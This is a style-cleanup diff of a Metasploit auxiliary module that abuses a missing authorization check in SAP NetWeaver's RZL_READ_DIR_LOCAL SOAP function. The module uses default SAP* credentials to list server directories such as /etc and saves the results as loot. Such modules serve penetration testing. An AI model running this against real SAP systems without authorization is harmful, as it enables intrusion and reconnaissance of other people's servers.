@@ -40,19 +40,23 @@ class MetasploitModule < Msf::Auxiliary
         [ 'OSVDB', '92732'],
         [ 'URL', 'http://erpscan.com/advisories/dsecrg-12-026-sap-netweaver-rzl_read_dir_local-missing-authorization-check-and-smb-relay-vulnerability/' ]
       ],
-      'Author' =>
-        [
-          'Alexey Tyurin', # Vulnerability discovery
-          'nmonkee' # Metasploit module
-        ],
-      'License' => MSF_LICENSE
+      'Author' => [
+        'Alexey Tyurin', # Vulnerability discovery
+        'nmonkee' # Metasploit module
+      ],
+      'License' => MSF_LICENSE,
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [],
+        'Reliability' => []
+      }
     )
 
     register_options([
       OptString.new('CLIENT', [true, 'SAP Client', '001']),
       OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
       OptString.new('HttpPassword', [true, 'Password', '06071992']),
-      OptString.new('DIR',[true,'Directory path (e.g. /etc)','/etc'])
+      OptString.new('DIR', [true, 'Directory path (e.g. /etc)', '/etc'])
     ])
   end
 
@@ -62,18 +66,18 @@ class MetasploitModule < Msf::Auxiliary
     xml_doc.root.each_element('//item') do |item|
       name = size = nil
       item.each_element do |elem|
-        name = elem.text if elem.name == "NAME"
-        size = elem.text if elem.name == "SIZE"
-        break if name and size
+        name = elem.text if elem.name == 'NAME'
+        size = elem.text if elem.name == 'SIZE'
+        break if name && size
       end
-      if (name and size) and not (name.empty? or size.empty?)
-        files << { "name" => name, "size" => size }
+      if name && size && !(name.empty? || size.empty?)
+        files << { 'name' => name, 'size' => size }
       end
     end
     return files
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     data = '<?xml version="1.0" encoding="utf-8" ?>'
     data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  '
     data << 'xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  '
@@ -102,20 +106,20 @@ class MetasploitModule < Msf::Auxiliary
         'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
         'ctype' => 'text/xml; charset=UTF-8',
         'headers' => {
-          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
+          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions'
         },
         'vars_get' => {
           'sap-client' => datastore['CLIENT'],
           'sap-language' => 'EN'
         }
       })
-      if res and res.code == 200 and res.body =~ /rfc:RZL_READ_DIR_LOCAL.Response/
+      if res && (res.code == 200) && res.body =~ /rfc:RZL_READ_DIR_LOCAL.Response/
         files = parse_xml(res.body)
-        path = store_loot("sap.soap.rfc.dir", "text/xml", rhost, res.body, datastore['DIR'])
+        path = store_loot('sap.soap.rfc.dir', 'text/xml', rhost, res.body, datastore['DIR'])
         print_good("#{rhost}:#{rport} - #{datastore['DIR']} successfully enumerated, results stored on #{path}")
-        files.each { |f|
-          vprint_line("Entry: #{f["name"]}, Size: #{f["size"].to_i}")
-        }
+        files.each do |f|
+          vprint_line("Entry: #{f['name']}, Size: #{f['size'].to_i}")
+        end
       end
     rescue ::Rex::ConnectionError
       vprint_error("#{rhost}:#{rport} - Unable to connect")
